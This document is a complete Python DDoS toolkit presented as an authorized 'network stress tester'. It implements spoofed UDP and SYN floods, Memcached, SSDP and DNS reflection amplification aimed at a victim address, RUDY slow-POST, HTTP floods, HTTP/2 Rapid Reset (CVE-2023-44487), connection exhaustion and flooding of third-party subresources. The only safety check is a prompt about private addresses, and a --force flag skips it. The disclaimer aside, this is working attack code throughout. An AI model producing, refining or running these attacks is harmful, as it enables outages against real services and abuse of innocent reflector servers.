#!/usr/bin/env python3
"""
Network Stress Tester V2 – For Authorized Security Testing Only
DO NOT use against any system without explicit permission.
"""

import sys
import time
import random
import socket
import struct
import threading
import argparse
import ipaddress
import os
import warnings
from concurrent.futures import ThreadPoolExecutor

# ----------------------------------------------------------------------
# Import checks
# ----------------------------------------------------------------------
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, fragment, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] scapy not installed. Install with: pip install scapy", file=sys.stderr)

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[!] requests not installed. Install with: pip install requests", file=sys.stderr)

# For HTTP/2 Rapid Reset
try:
    import h2.connection
    import h2.config
    import h2.events
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False
    print("[!] h2 not installed. HTTP/2 Rapid Reset disabled. Install: pip install h2", file=sys.stderr)

# For proper TLS renegotiation (optional)
try:
    import OpenSSL
    PYOPENSSL_AVAILABLE = True
except ImportError:
    PYOPENSSL_AVAILABLE = False

# ----------------------------------------------------------------------
# Safety checks
# ----------------------------------------------------------------------
def confirm_target(target_ip, target_cidr=None, force=False):
    """Warn about private IPs / ask for confirmation."""
    if force:
        return
    try:
        ip = ipaddress.ip_address(target_ip)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            print(f"[*] Target {target_ip} looks like a private/local address.")
            print("    Testing on your own network is acceptable if you own all devices.")
            resp = input("    Continue anyway? (y/N): ").strip().lower()
            if resp != 'y':
                print("[!] Aborted.")
                sys.exit(1)
    except ValueError:
        pass  # domain name

# ----------------------------------------------------------------------
# VOLUMETRIC FLOODS (fixed spoofing)
# ----------------------------------------------------------------------
def udp_flood(target_ip, port, duration, packet_rate=1000, random_port=True):
    """UDP flood – fixed."""
    print(f"[*] UDP Flood: {target_ip}:{port if port else 'random'} for {duration}s")
    end_time = time.time() + duration
    sent = 0
    if SCAPY_AVAILABLE:
        while time.time() < end_time:
            dport = port if not random_port else random.randint(1, 65535)
            pkt = IP(dst=target_ip)/UDP(dport=dport)/Raw(load=b'X'*1024)
            send(pkt, verbose=False, loop=0, count=packet_rate)
            sent += packet_rate
            time.sleep(1)
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'X' * 1024
        while time.time() < end_time:
            for _ in range(packet_rate):
                dst_port = port if not random_port else random.randint(1, 65535)
                sock.sendto(payload, (target_ip, dst_port))
                sent += 1
            time.sleep(1)
        sock.close()
    print(f"[*] UDP Flood finished, sent ~{sent} packets")

def syn_flood(target_ip, port, duration, packet_rate=1000, spoofed=True):
    """SYN flood – fixed spoofing logic."""
    print(f"[*] SYN Flood: {target_ip}:{port} for {duration}s")
    if not SCAPY_AVAILABLE:
        print("[!] scapy required.")
        return
    end_time = time.time() + duration
    sent = 0
    while time.time() < end_time:
        for _ in range(packet_rate):
            if spoofed:
                # Generate a random string IP
                src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            else:
                src_ip = target_ip  # nonsense but allowed if you want to test your own syn cookies
            pkt = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=port, flags='S', seq=random.randint(0,4294967295))
            send(pkt, verbose=False)
            sent += 1
        time.sleep(1)
    print(f"[*] SYN Flood finished, sent ~{sent} packets")

def rudy_attack(target_url, duration, num_connections=50):
    """
    Proper RUDY – raw socket POST with slow body transmission.
    """
    print(f"[*] RUDY (real): {target_url} for {duration}s")
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    host = parsed.netloc.split(':')[0]
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'
    # For simplicity, we'll do HTTP (not HTTPS) – HTTPS RUDY is more complex
    if parsed.scheme == 'https':
        print("[!] RUDY over HTTPS not implemented due to TLS sequencing; use HTTP.")
        return

    stop_event = threading.Event()
    def attacker():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                # Send POST headers with large Content-Length
                body_size = 1024 * 1024  # 1 MB declared
                headers = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    "User-Agent: Mozilla/5.0\r\n"
                    f"Content-Length: {body_size}\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "\r\n"
                )
                s.send(headers.encode())
                # Drip body bytes very slowly
                chunk = b"A"
                bytes_sent = 0
                while bytes_sent < body_size and not stop_event.is_set():
                    s.send(chunk)
                    bytes_sent += 1
                    time.sleep(0.05)  # 50ms per byte = extremely slow
                s.close()
            except Exception:
                pass
            time.sleep(0.5)

    threads = []
    for _ in range(num_connections):
        t = threading.Thread(target=attacker)
        t.start()
        threads.append(t)
    time.sleep(duration)
    stop_event.set()
    for t in threads:
        t.join()
    print("[*] RUDY finished")

def tcp_pulse(target_ip, port, duration, burst_duration_ms=50, burst_rate=10000):
    """TCP Pulse – respects duration."""
    print(f"[*] TCP Pulse: {target_ip}:{port} burst {burst_duration_ms}ms, rate {burst_rate} pps for {duration}s")
    if not SCAPY_AVAILABLE:
        print("[!] scapy required.")
        return
    end_time = time.time() + duration
    while time.time() < end_time:
        burst_end = time.time() + burst_duration_ms/1000.0
        sent = 0
        while time.time() < burst_end:
            # Send as many as possible within burst window
            for _ in range(burst_rate // 10):
                pkt = IP(dst=target_ip)/TCP(dport=port, flags='S', seq=random.randint(0,4294967295))
                send(pkt, verbose=False)
                sent += 1
            time.sleep(0.0001)
        print(f"[*] Pulse sent {sent} packets")
        time.sleep(2)  # wait between bursts

# ----------------------------------------------------------------------
# AMPLIFICATION ATTACKS – Memcached, SSDP
# ----------------------------------------------------------------------
def memcached_amp(target_ip, memcached_servers, duration, packet_rate=500):
    """Memcached UDP amplification – up to 51,000×."""
    print(f"[*] Memcached Amplification: spoofing {target_ip} via {len(memcached_servers)} servers")
    if not SCAPY_AVAILABLE:
        print("[!] scapy required.")
        return
    # Memcached UDP requests require an 8-byte binary header:
    #   [request_id (2B)] [sequence (2B)] [total_datagrams (2B)] [reserved (2B)]
    # Without this, most servers silently discard the packet and nothing is reflected.
    end_time = time.time() + duration
    sent = 0
    while time.time() < end_time:
        for server in memcached_servers:
            request_id = random.randint(0, 65535)
            udp_header = struct.pack(">HHHH", request_id, 0, 1, 0)
            command = udp_header + b"get big\r\n"
            pkt = IP(src=target_ip, dst=server)/UDP(sport=random.randint(1024,65535), dport=11211)/Raw(load=command)
            send(pkt, verbose=False)
            sent += 1
            time.sleep(1.0 / packet_rate)
    print(f"[*] Memcached amplification finished, sent ~{sent} queries")

def ssdp_amp(target_ip, ssdp_targets, duration, packet_rate=500):
    """SSDP amplification – M‑SEARCH to UPnP devices."""
    print(f"[*] SSDP Amplification: spoofing {target_ip} via {len(ssdp_targets)} devices")
    if not SCAPY_AVAILABLE:
        print("[!] scapy required.")
        return
    # SSDP M-SEARCH payload
    payload = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 2\r\n"
        "ST: upnp:rootdevice\r\n\r\n"
    ).encode()
    end_time = time.time() + duration
    sent = 0
    while time.time() < end_time:
        for target in ssdp_targets:
            pkt = IP(src=target_ip, dst=target)/UDP(sport=random.randint(1024,65535), dport=1900)/Raw(load=payload)
            send(pkt, verbose=False)
            sent += 1
            time.sleep(1.0 / packet_rate)
    print(f"[*] SSDP amplification finished, sent ~{sent} requests")

# ----------------------------------------------------------------------
# APPLICATION LAYER – enhanced
# ----------------------------------------------------------------------
def http_flood(target_url, duration, threads=50, method='GET', cache_bust=False, enforce_https=False):
    """HTTP/HTTPS flood with cache‑busting option."""
    print(f"[*] HTTP {method} Flood: {target_url} for {duration}s (cache_bust={cache_bust}, enforce_https={enforce_https})")
    if not REQUESTS_AVAILABLE:
        print("[!] requests library required.")
        return
    if enforce_https and not target_url.startswith('https'):
        print("[!] --enforce-https requires HTTPS URL.")
        return
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    stop_event = threading.Event()
    def worker():
        while not stop_event.is_set():
            url = target_url
            if cache_bust:
                sep = '&' if '?' in url else '?'
                url += f"{sep}nocache={random.randint(1,1000000)}"
            try:
                if method == 'GET':
                    requests.get(url, headers=headers, verify=False, timeout=2)
                else:
                    requests.post(url, data={'x': 'y'*500}, headers=headers, verify=False, timeout=2)
            except Exception:
                pass
            time.sleep(random.uniform(0.005, 0.02))
    workers = [threading.Thread(target=worker) for _ in range(threads)]
    for t in workers:
        t.start()
    time.sleep(duration)
    stop_event.set()
    for t in workers:
        t.join()
    print("[*] HTTP flood finished")

def http2_rapid_reset(target_host, port, duration, threads=10):
    """
    HTTP/2 Rapid Reset (CVE-2023-44487).
    Sends HEADERS + RST_STREAM in rapid succession.
    """
    print(f"[*] HTTP/2 Rapid Reset: {target_host}:{port} for {duration}s")
    if not H2_AVAILABLE:
        print("[!] h2 library required. Install: pip install h2")
        return
    import h2.connection, h2.config, h2.events, ssl

    stop_event = threading.Event()
    def worker():
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_host, port))
                ctx = ssl.create_default_context()
                ctx.set_alpn_protocols(['h2'])   # Fix: advertise h2 via ALPN or server won't negotiate HTTP/2
                sock = ctx.wrap_socket(sock, server_hostname=target_host)
                # Verify the server actually negotiated h2; abort if not
                if sock.selected_alpn_protocol() != 'h2':
                    sock.close()
                    continue
                config = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=config)
                conn.initiate_connection()
                sock.send(conn.data_to_send())
                # Rapid reset loop
                for _ in range(100):
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(stream_id, [(':method', 'GET'), (':path', '/'), (':scheme', 'https'), (':authority', target_host)], end_stream=False)
                    conn.reset_stream(stream_id)
                    sock.send(conn.data_to_send())
                    time.sleep(0.0001)
                sock.close()
            except Exception:
                pass
            time.sleep(0.01)

    threads_list = [threading.Thread(target=worker) for _ in range(threads)]
    for t in threads_list:
        t.start()
    time.sleep(duration)
    stop_event.set()
    for t in threads_list:
        t.join()
    print("[*] HTTP/2 Rapid Reset finished")

def dns_expensive_query(target_dns_server, victim_ip, duration, packet_rate=500):
    """
    DNS query flood with expensive records (DNSSEC, TXT, RRSIG).
    Spoofs victim IP to reflect amplified CPU load.
    """
    print(f"[*] DNS Expensive Query: spoofing {victim_ip} -> {target_dns_server}")
    if not SCAPY_AVAILABLE:
        print("[!] scapy required.")
        return
    # Build a DNS query for a TXT record that may trigger DNSSEC validation
    # Example: query for _dmarc.google.com (TXT) – but we need generic
    domain = "example.com"  # you can change
    from scapy.layers.dns import DNS, DNSQR
    end_time = time.time() + duration
    sent = 0
    while time.time() < end_time:
        pkt = IP(src=victim_ip, dst=target_dns_server)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(id=random.randint(0,65535), qr=0, qd=DNSQR(qname=domain, qtype='TXT'))
        send(pkt, verbose=False)
        sent += 1
        time.sleep(1.0 / packet_rate)
    print(f"[*] DNS expensive query finished, sent ~{sent} queries")

def connection_pool_exhaustion(target_host, port, duration, num_connections=500):
    """
    Open many TCP connections and hold them without data (non‑HTTP idle).
    Exhausts connection pools on firewalls, load balancers, and database proxies.
    """
    print(f"[*] Connection pool exhaustion: {target_host}:{port} for {duration}s")
    sockets = []
    end_time = time.time() + duration
    while time.time() < end_time and len(sockets) < num_connections:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_host, port))
            sockets.append(s)
        except Exception:
            break
    # Hold connections open for whatever time remains within the original duration window
    remaining = end_time - time.time()
    if remaining > 0:
        time.sleep(remaining)
    for s in sockets:
        s.close()
    print(f"[*] Opened {len(sockets)} persistent connections")

def subresource_dos(target_domain, subresource_urls, duration, threads=50):
    """
    Flood third-party subresources that your authorized target depends on.
    URLs must be explicitly supplied via --subresource-urls; no defaults are
    provided to prevent accidental testing against infrastructure you don't own.
    """
    if not subresource_urls:
        print("[!] --subresource-urls required for subresource attack.")
        print("    Example: --subresource-urls http://cdn.example.com/app.js http://api.example.com/data")
        return
    print(f"[*] Sub-resource DoS: flooding {len(subresource_urls)} URL(s) for {duration}s")
    if not REQUESTS_AVAILABLE:
        print("[!] requests required.")
        return
    stop_event = threading.Event()
    def worker():
        while not stop_event.is_set():
            for url in subresource_urls:
                try:
                    requests.get(url, timeout=2, verify=False)
                except Exception:
                    pass
                time.sleep(0.01)
    workers = [threading.Thread(target=worker) for _ in range(threads)]
    for t in workers:
        t.start()
    time.sleep(duration)
    stop_event.set()
    for t in workers:
        t.join()
    print("[*] Sub-resource DoS finished")

# ----------------------------------------------------------------------
# MAIN DISPATCHER (updated with new attacks)
# ----------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Network stress tester V2 – authorized use only.")
    parser.add_argument("--target", required=True, help="Target IP, domain, or CIDR")
    parser.add_argument("--port", type=int, help="Port for TCP/UDP attacks")
    parser.add_argument("--attack", required=True, choices=[
        'udp', 'syn', 'rudy', 'tcp_pulse', 'memcached_amp', 'ssdp_amp',
        'http_get', 'http_post', 'http2_rapid_reset', 'dns_expensive',
        'conn_pool', 'subresource'
    ], help="Attack type")
    parser.add_argument("--duration", type=int, default=30)
    parser.add_argument("--rate", type=int, default=1000, help="Packets per second")
    parser.add_argument("--threads", type=int, default=50)
    parser.add_argument("--url", help="URL for HTTP attacks")
    parser.add_argument("--memcached-servers", nargs='+', help="List of memcached servers for amplification")
    parser.add_argument("--ssdp-targets", nargs='+', help="List of SSDP targets (UPnP devices)")
    parser.add_argument("--dns-server", help="DNS server for expensive queries")
    parser.add_argument("--subresource-urls", nargs='+', help="Explicit URLs for subresource DoS (required for subresource attack)")
    parser.add_argument("--cache-bust", action="store_true", help="Append random query string")
    parser.add_argument("--enforce-https", action="store_true", help="Only allow HTTPS for L7 floods")
    parser.add_argument("--force", action="store_true", help="Skip safety prompts")
    args = parser.parse_args()

    # Safety confirmations
    if args.attack not in ['http_get','http_post','http2_rapid_reset','subresource']:
        target_ip = args.target
        try:
            target_ip = socket.gethostbyname(args.target)
        except:
            pass
        confirm_target(target_ip, force=args.force)

    # Attack execution
    try:
        if args.attack == 'udp':
            udp_flood(args.target, args.port, args.duration, args.rate, random_port=not args.port)
        elif args.attack == 'syn':
            if not args.port:
                print("[!] --port required")
                sys.exit(1)
            syn_flood(args.target, args.port, args.duration, args.rate, spoofed=True)
        elif args.attack == 'rudy':
            if not args.url:
                print("[!] --url required")
                sys.exit(1)
            rudy_attack(args.url, args.duration, args.threads)
        elif args.attack == 'tcp_pulse':
            if not args.port:
                print("[!] --port required")
                sys.exit(1)
            tcp_pulse(args.target, args.port, args.duration, burst_duration_ms=50, burst_rate=args.rate)
        elif args.attack == 'memcached_amp':
            if not args.memcached_servers:
                print("[!] --memcached-servers required")
                sys.exit(1)
            memcached_amp(args.target, args.memcached_servers, args.duration, args.rate)
        elif args.attack == 'ssdp_amp':
            if not args.ssdp_targets:
                print("[!] --ssdp-targets required")
                sys.exit(1)
            ssdp_amp(args.target, args.ssdp_targets, args.duration, args.rate)
        elif args.attack in ('http_get', 'http_post'):
            if not args.url:
                print("[!] --url required")
                sys.exit(1)
            http_flood(args.url, args.duration, args.threads, method='GET' if args.attack=='http_get' else 'POST', cache_bust=args.cache_bust, enforce_https=args.enforce_https)
        elif args.attack == 'http2_rapid_reset':
            if not args.port or not args.target:
                print("[!] --target and --port required")
                sys.exit(1)
            http2_rapid_reset(args.target, args.port, args.duration, args.threads)
        elif args.attack == 'dns_expensive':
            if not args.dns_server:
                print("[!] --dns-server required")
                sys.exit(1)
            dns_expensive_query(args.dns_server, args.target, args.duration, args.rate)
        elif args.attack == 'conn_pool':
            if not args.port:
                print("[!] --port required")
                sys.exit(1)
            connection_pool_exhaustion(args.target, args.port, args.duration, num_connections=500)
        elif args.attack == 'subresource':
            subresource_dos(args.target, args.subresource_urls, args.duration, args.threads)
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if not SCAPY_AVAILABLE:
        print("[!] WARNING: scapy missing – many attacks disabled.")
    if not REQUESTS_AVAILABLE:
        print("[!] WARNING: requests missing – HTTP flood/subresource attacks disabled.")
    if sys.platform != 'win32' and os.geteuid() != 0:
        print("[!] WARNING: root/admin required for raw socket attacks (spoofing, L3/L4).")
    main()
